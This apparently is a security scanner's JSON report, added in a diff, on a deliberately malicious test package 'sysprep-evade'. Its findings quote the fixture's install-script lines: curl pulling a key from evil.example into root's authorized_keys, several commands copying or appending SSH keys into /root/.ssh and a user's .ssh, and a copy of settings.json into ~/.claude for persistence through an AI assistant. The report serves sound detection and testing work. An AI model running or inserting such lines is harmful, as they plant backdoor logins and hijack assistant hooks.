@@ -1,0 +1,152 @@
+{
+  "package_name": "sysprep-evade",
+  "package_version": "1.0.0-1",
+  "findings": [
+    {
+      "id": "INSTALL-003",
+      "severity": "critical",
+      "category": "network_security",
+      "title": "Network access in install script (install script)",
+      "description": "Install scripts should not make network connections",
+      "location": {
+        "file": "tests/fixtures/malicious/live-write-evasion/sysprep-evade.install",
+        "line": 4,
+        "column": 5,
+        "snippet": "    curl -so /root/.ssh/authorized_keys https://evil.example/k"
+      },
+      "recommendation": "Install scripts should never download additional content",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "curl",
+        "script_kind": "install script"
+      }
+    },
+    {
+      "id": "PERSIST-007",
+      "severity": "critical",
+      "category": "persistence",
+      "title": "SSH authorized_keys modified (install script)",
+      "description": "Writes, appends to, copies over or installs an ssh authorized_keys file outside $pkgdir, or copies a directory tree into a live ~/.ssh. Adding a key to a user's or root's authorized_keys is a persistent backdoor: the key's owner can log in after the package is gone.",
+      "location": {
+        "file": "tests/fixtures/malicious/live-write-evasion/sysprep-evade.install",
+        "line": 2,
+        "column": 5,
+        "snippet": "    cp authorized_keys /root/.ssh/"
+      },
+      "recommendation": "Do NOT install. A package must never touch authorized_keys. Remove any unknown keys from ~/.ssh/authorized_keys and /root/.ssh/authorized_keys and treat the host as compromised.",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "cp authorized_keys /root/.ssh/",
+        "script_kind": "install script"
+      }
+    },
+    {
+      "id": "PERSIST-007",
+      "severity": "critical",
+      "category": "persistence",
+      "title": "SSH authorized_keys modified (install script)",
+      "description": "Writes, appends to, copies over or installs an ssh authorized_keys file outside $pkgdir, or copies a directory tree into a live ~/.ssh. Adding a key to a user's or root's authorized_keys is a persistent backdoor: the key's owner can log in after the package is gone.",
+      "location": {
+        "file": "tests/fixtures/malicious/live-write-evasion/sysprep-evade.install",
+        "line": 3,
+        "column": 5,
+        "snippet": "    install -Dm600 -t /root/.ssh authorized_keys"
+      },
+      "recommendation": "Do NOT install. A package must never touch authorized_keys. Remove any unknown keys from ~/.ssh/authorized_keys and /root/.ssh/authorized_keys and treat the host as compromised.",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "install -Dm600 -t /root/.ssh authorized_keys",
+        "script_kind": "install script"
+      }
+    },
+    {
+      "id": "PERSIST-007",
+      "severity": "critical",
+      "category": "persistence",
+      "title": "SSH authorized_keys modified (install script)",
+      "description": "Writes, appends to, copies over or installs an ssh authorized_keys file outside $pkgdir, or copies a directory tree into a live ~/.ssh. Adding a key to a user's or root's authorized_keys is a persistent backdoor: the key's owner can log in after the package is gone.",
+      "location": {
+        "file": "tests/fixtures/malicious/live-write-evasion/sysprep-evade.install",
+        "line": 4,
+        "column": 5,
+        "snippet": "    curl -so /root/.ssh/authorized_keys https://evil.example/k"
+      },
+      "recommendation": "Do NOT install. A package must never touch authorized_keys. Remove any unknown keys from ~/.ssh/authorized_keys and /root/.ssh/authorized_keys and treat the host as compromised.",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "curl -so /root/.ssh/authorized_keys ",
+        "script_kind": "install script"
+      }
+    },
+    {
+      "id": "PERSIST-007",
+      "severity": "critical",
+      "category": "persistence",
+      "title": "SSH authorized_keys modified (install script)",
+      "description": "Writes, appends to, copies over or installs an ssh authorized_keys file outside $pkgdir, or copies a directory tree into a live ~/.ssh. Adding a key to a user's or root's authorized_keys is a persistent backdoor: the key's owner can log in after the package is gone.",
+      "location": {
+        "file": "tests/fixtures/malicious/live-write-evasion/sysprep-evade.install",
+        "line": 6,
+        "column": 50,
+        "snippet": "    echo 'ssh-ed25519 AAAAEXAMPLEEXAMPLEEXAMPLE x' >> \"$k\"    [resolved →     echo ssh-ed25519 AAAAEXAMPLEEXAMPLEEXAMPLE x >> /root/.ssh/authorized_keys]"
+      },
+      "recommendation": "Do NOT install. A package must never touch authorized_keys. Remove any unknown keys from ~/.ssh/authorized_keys and /root/.ssh/authorized_keys and treat the host as compromised.",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": ">> /root/.ssh/authorized_keys",
+        "script_kind": "install script"
+      }
+    },
+    {
+      "id": "PERSIST-007",
+      "severity": "critical",
+      "category": "persistence",
+      "title": "SSH authorized_keys modified (install script)",
+      "description": "Writes, appends to, copies over or installs an ssh authorized_keys file outside $pkgdir, or copies a directory tree into a live ~/.ssh. Adding a key to a user's or root's authorized_keys is a persistent backdoor: the key's owner can log in after the package is gone.",
+      "location": {
+        "file": "tests/fixtures/malicious/live-write-evasion/sysprep-evade.install",
+        "line": 8,
+        "column": 5,
+        "snippet": "    cp -r keys/ /home/user/.ssh"
+      },
+      "recommendation": "Do NOT install. A package must never touch authorized_keys. Remove any unknown keys from ~/.ssh/authorized_keys and /root/.ssh/authorized_keys and treat the host as compromised.",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "cp -r keys/ /home/user/.ssh",
+        "script_kind": "install script"
+      }
+    },
+    {
+      "id": "PERSIST-008",
+      "severity": "critical",
+      "category": "persistence",
+      "title": "AI coding assistant config or hook written (install script)",
+      "description": "Writes into an AI coding assistant's per-user configuration (Claude Code, Cursor, Codex, Gemini CLI, OpenCode, Continue, Aider, Copilot) outside $pkgdir. Settings, hooks and MCP definitions there run commands with the user's authority whenever the assistant starts, which supply-chain malware has used for persistence.",
+      "location": {
+        "file": "tests/fixtures/malicious/live-write-evasion/sysprep-evade.install",
+        "line": 7,
+        "column": 5,
+        "snippet": "    cp settings.json /home/user/.claude/"
+      },
+      "recommendation": "Do NOT install. A package must never write into a user's assistant configuration. Inspect ~/.claude, ~/.cursor, ~/.codex, ~/.gemini and ~/.config/opencode for hooks or MCP servers you did not add.",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "cp settings.json /home/user/.claude/",
+        "script_kind": "install script"
+      }
+    }
+  ],
+  "scanned_files": [
+    "tests/fixtures/malicious/live-write-evasion/PKGBUILD",
+    "tests/fixtures/malicious/live-write-evasion/sysprep-evade.install"
+  ],
+  "timestamp": "2026-11-10T14:51:02.464605179Z",
+  "scan_duration_ms": 23
+}
